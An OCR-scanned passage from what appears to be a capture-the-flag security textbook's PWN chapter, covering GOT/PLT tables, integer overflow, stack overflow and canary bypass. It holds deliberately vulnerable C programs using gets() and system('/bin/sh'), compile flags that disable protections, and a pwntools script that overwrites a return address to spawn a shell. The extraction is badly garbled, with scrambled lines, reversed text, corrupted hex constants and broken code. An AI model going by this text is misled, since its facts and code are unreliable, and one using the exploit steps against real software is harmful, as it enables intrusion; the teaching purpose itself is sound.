plt:ee6
921901000
Fig, 6.5 PLT code
got-plt:
pt.plt:
ted In asseebly
got-plt:
pot.plt:
000006810N
d_601008
dqe
DATA XAEF：s_4004ate
pot.plt:
got-plt:
off_se1018
etatogP
dq offset
dqe
stack,cha_fai3
DATA XREF:1ub_4004M8+611
e28T0900000
ff_601020
offset printf
Ot.pIT
eff_6e138
off_581928
dg effset _I1oc99_scanf
got-plt:
2000601830
M_s1t
ents
DAA XREF:Ls_anf
Fig, 6.6 .GOT.PLT code
the PLT's corresponding _printf iem, and all extermal library functions used in ELF
will have a corresponding PLT item.
The .PLT table is also codes that take an address out of memory and jumps it. The
address is the actual address of _printf, and the place where the actual address of the
_printf function is stored is in the .GOT.PLT table as shown in Fig. 6.6.
PLT table is actually a function pointer array that contains the addresses of all
extermal functions used in ELF. The initialization of the .GOT.PLT table is done by
the operating system.
Of course, due to Linux's special Lazy Binding mechanism. PLT table is initial-
ized during the first call to the function. In other words, the .GOT.PLT table will
store the function’s real address after the function have been called. You can refer to
some related information if you interesting in i.
So, what is the role of .GOT.PLT and .PLT for PWN? Firstly, PLT can directly
call some external function, which will be very helpful in the stack overflow.
Secondly, since GOT.PLT usually stores the address of a function in libc, you can
read .GOT.PLT to obtain the address of libc or write .GOT.PLT to control the
execution flow of the program.
---
## Page 450
6.2 Integer Overflow
437
6.2 Integer Overflow
The integer overflow is a relatively simple content in PWN.Of course, it does not
mean that the topic of integer overflow is relatively simple, only that integer
overflow itself is not very complex.
6.2.1Operations with Integers
Computers can’t store infinitely large integers, and the values represented by integer
types in computers is a subset of natural numbers. For example, in a 32-bit C
program, the length of unsigned int is 32 bits, and the largest number that can be
represented is 0xfmf If you add 1 to this number,the result 0x1000000 will
exceed the range of 32 bits and only the lower 32 bits will be intercepted, and the
number will eventually become 0. This is unsigned overflow.
st sia ne usn sndo u smoao au jo sad mo ane aa
the example.
• Unsigned Overflow: unsigned number Oxffffff plus 1 becomes 0.
Unsigned underflow: unsigned number 0 minus 1 becomes Oxffff.
• Signed overflow: A signed number positive Ox7ffff plus 1 becomes negative
0x80000000 (-2147483648).
• Unsigned underflow: Signed negative number 0x80000000 minus 1 becomes
positive Ox7ff
In addition, the direct conversion of signed and unsigned numbers can lead to integer
size mutations. For example, signed number -1 and unsigned number Oxffff are
identical in binary, and direct conversion of the two can lead to unintended behavior
in the program.
6.2.2How to Use Integer Overflow
Although integer overflows are simple, they are not simple to exploit. Unlike
memory corruptions such as stack overflow, which can be directly exploited by
overwriting the return address in the stack, integer overflows often require some
1. integer overflow convert to buffer overflow
Integer overflow can mutate a small number into a large number. For example,
unsigned underflow can turn a number which represents the size of a buffer into a
very large integer by subtraction. This results in a buffer overflow.
---
## Page 451
438
6PWN
Another way to bypass the length check is to enter a negative number, as some
programs use signed numbers for buffer’s length. Most APIs use unsigned numbers
for the length, and negative numbers can become large positive numbers and cause
overflow.
2. integer overflow to array out of bounds.
In C, the operation of an array index is implemented by simply adding an index to the
array pointer and does not check the boundary. Therefore, a large index will access the
data after the array. If the index is negative, it will also access the memoey before the aray.
Usually, integer overflow to array out-of-bounds is more common. During array
indexing, the index is also multiplied by the length of the array element to calculate
the actual address of the element. In the case of an int-type array, the array index
needs to be multiplied by 4 to calculate the offset. If you bypass boundary checking
by passing a negative number, you can access to the memory before the array.
However, since the index is multiplied by 4, it is still possible to index the data after
0x1000 bytes after the aray, you only need to pass the negative number 
the array or even the entire memory space. For example, to index the content at
2147482624, which is 0x80000400 in hexadecimal. The number multiplied by the
length of the element 4, results in 0x00001000 due to the overflow of unsigned
o oau uq nodx o aisea s spuoq-jo-sno eue *as ueo no sy siaso!
flows to buffer overflows.
6.3 Stack Overflow
Stack is a simple and classical data structure, which use the first-in, first-out (FILO)
method to access the data in the stack. In general, the last data to be pushed in th
stack is called top-of-stack data, and the location where it is stored is called the top of
the stack. The operation of storing data into the stack is called push and the operation
of removing data from the top of the stack is called pop.
Since the sequence of function calls is also such that the first function called
returns last,the stack is ideally suited for storing temporary data that are used during
function execution.
Currently, widely used architectures (x86, ARM, MIPS, etc.) support stack
operation at the instruction level and are designed with special registers to store
the address of the top of the stack. In most cases, push data into the stack causes the
top of the stack to grow from a high memory address to a low address.
1. stack overflow principle
Stack overflow is one of buffer overflow. Local variables of a function are usually
stored on the stack. If one of these buffers overflows, it is called stack overflow. The
most classical use of stack overflow is to overwrite the return address of a function in
mog fonuoo tuelod  xoefq o 1apio
In x86, a function is typically called with the instruction call and returned with the
instruction ret. When the called function returm it will execute the ret instruction. the
---
## Page 452
6.3 Stack Overflow
439
 stack viev
00607FFD00AEFeB0
0889000088400450
_start
00007FFD00AEF0B8
00687FFD00AEFeC0
0889000083489568
vuln+19
4141000080400580
00007FFD0DAEFeC8
00007FFD00AEFe00
0088414141414141
00007FFD00AEF0E0
[stack]:00007FFDDDAEF0E0
00607FFD00AEF608
00007FFD00AEFeE8
00887FFD00AEF6E0
00687F0156D8EB97
0080000008400580
libc_2.27.so:_1ibc_start_main+E7
_libc_csu_init
00007FFD00AEF0F8
00607FFD00AEFeF0
00007FFD00AEF1C8
[stack]:00007FFD0DAEF1C8
00007FFD00AEF100
00007FFD00AEF108
0000600160608600
00007FFD00AEF110
0089000683408568
main
00007FFD0DAEF118
00007FFD00AEF120
0080000000408450
70ECC9689CFF5E19
_start
UNENoWN 000O7rroDDAEr0D8:[atack]:00o07rrDDDAEFOD8 (Synchzonized with R5P)
Fig, 6.7 Stack layout
CPU will pop the data at the top of the stack and assign it to the EIP register. This is
the data which tells the called function where it should return to, is called retum
address. Ideally, the popped address is the address pushed by the previous call. This
allows the program returm to the parent function and continue execution. The
if the child modifies the stack, it restores the stack to the state it was in when it
compiler makes sure that the child function can returm to the correct address even
entered the function.
Example 6.1
#include
#include
void she11 (1 {
system (#/bin/sh") ;
void vuln (1 {
char buf [10] ;
gets (buf) :
int main() {
vuln () ;
Use the following command to compile the program in Example 6.1, disabling
address randomization and stack overflow protection.
gcc -fno-stack-protector stack.c -o stack -no-pie
When the program executes the ret instruction, the stack layout is shown in
Fig. 6.7. At this time, 0x400579 saved at the top of the stack is the return address,
after executing the ret instruction, the program will jump to the location of
0x400579.
---
## Page 453
440
6PWN
text:
text:00N
CESOO
00537
public shel1
text：0000000000400537;_unind{
text:00
000400537 push
mov
rtp
rbp, rsp
text:0ee
sand
;/bin/sh*
text:0000000000400542 mov
eax,0
_systen
text:0090000090400540
pop
nop
retn
rbp
.text:000000088040054E
text:000000000040054E
E;}// starts at 400537
text:00004054F
.text:000000000040054E
shel1 endp
Fig, 6.8 IDA debugger window
Note that the returm address has a string of 0x414141414141 above it, which was
the data we just entered. Since the gets function does not check the length of the
input data, it can increase the input length until it overwrites the retum address. As
you can see from Fig. 6.7, the distance between the returm address and the first A is
18 bytes. If you enter more than 19 bytes, the returm address will be overwriten.
0x400537, and our goal is to let the program jump to that function so that it can
Analyzing the program with IDA, we know that the shell function is located at
execute system("/bin/sh°) to get a shell.
In order to input non-visible characters (such as address) to the program, we use a
very useful tool called pwntools.
The attack script is as follows.
#1 /usr/bin/python
from pn import *
# Import the pwntools 1ibrary
p = proceaa ('. /etack*)
# Run the local program *stack*
( {LE500xo)9d+gt+ : e, ) auTtpuas d
# Enter into the process and add *\n' at the end automatically. since
integers in x64 are stored # in little-endian (low bits are stored at low
# The p64 function wi11 automatica1ly convert the 64-bit integer
address) .
se 5uxe /q-8 o LE500x0
p.interactive ()
# *\x3 7\x05\x40\,x0 0′,x00′,x00′,x0 0\x00\x00",
# Svitch to interaction mode
Use IDA attach to the process, we can see the return address is overwritten to
Ox400537 when it execute to theret Then continue the program, it willjumps to the
shell function and get the shell (see Fig. 6.8).
2. stack protection technology
Stack overflow is easy to exploit and can be very damaging. In order to mitigate the
growing security problems caused by stack overflow, developers introduced the
Canary mechanism which can detect stack overflow attacks.
---
## Page 454
6.3 Stack Overflow
441
pom So pue *au e paaua Koq uaqm Areueo e ueo m siouu rsed s u
observe the status of the canary to determine the oxygen level. The Canary protec-
tion mechanism is similar, by inserting a random number in front of the stack where
saves rbp, so that if an attacker overwrites the retum address using a stack overflow
vulnerability, the Canary will be overwritten as well. The compiler adds the code
before ret instruction that checks if Canary's value has been changed. If it is
changed, an exception wil be thrown, which will interrupt the program to prevent
the attack.
However, this method is not always reliable, as in Example 6.2.
Example 6.2
#include
#include
void she11 (1 {
system (*/bin/sh) ;
void vuln (1 {
char buf [10] ;
 (=t μndu下a) snd
read (0, buf, 100);
puts ("input 2:*) ;
puts (buf) ;
fgets (buf, 0x1oo, stdin) ;
int main(1 {
vuln () ;
Enable stack protection on compile.
gcc stack2.c -no-pie -fstack-protector-a11 -o stack2
When the vuln function enters, it takes out the value of Canary from fs:28 and
places it in rbp-8. Before the function return, it compares the value in rbp-8 with the
value in fs:28. If it is changed, it calls the _ _stack_chk_fail function, which will
output an error message and exit the program (see Figs. 6.9 and 6.10).
s u un o aq s nu  sd od  
which can leak the canary on the stack and bypass the detection. It is possible to leak
the Canary by limiting the length of the input string. Since the lowest byte of the
Canary is Ox00, an extra character need to sent to cover Ox00 to prevent it from being
truncated by 0.
>>>> p=process (* . /stack2)
[x] Starting local process ' . /stack2'
[+] Starting local process ' . /stack2' : pid 11858
>>>> p-recv [1
---
## Page 455
442
6PWN
text:690006s040062
public vuln
text:00000000
vuln
prec near
CODE XREF:#a
text:00000000
buf
- byte ptr -12h
text:e000000800400686
text:
var_8
= qvord ptr -8
text:e
urwind (
text:eeo00e0edo4ooss
text:0000000000400687
push
rbp
text:0000000
040068A
BOV
sub
rsp,
rbp,
rsp
BOV
rax, fs:28h
26h
text:00000000004006C8
[rbp+var_8],rax
text:00000000
400GCD
xor
lea
eax, eax
-text:0000000
rdi,s
; "input 1:*
cal1
Puts
Fig, 6.9 vuln code segment 1
text:0N
2000000400702
tal1
text:0000000000400707
le
text:608080800848070E
text:00
text:ON
000000480712
N0000480717
ca11
BOV
rdl,rax
n
text:008
text:ON
9800848071A
000048071F
nop
text!o
00400720
ADW
rax,[ebpavar_8]
text:00
text:0
98808488724
x0or
rax, fs:28h
short locret_400734
text:
text:0
00480734
400721
call
stack_chk_fail
teat:
teat:
200734
20734
ret_400734:
: CCDE XREF: vuln+771j
text:
00734
29735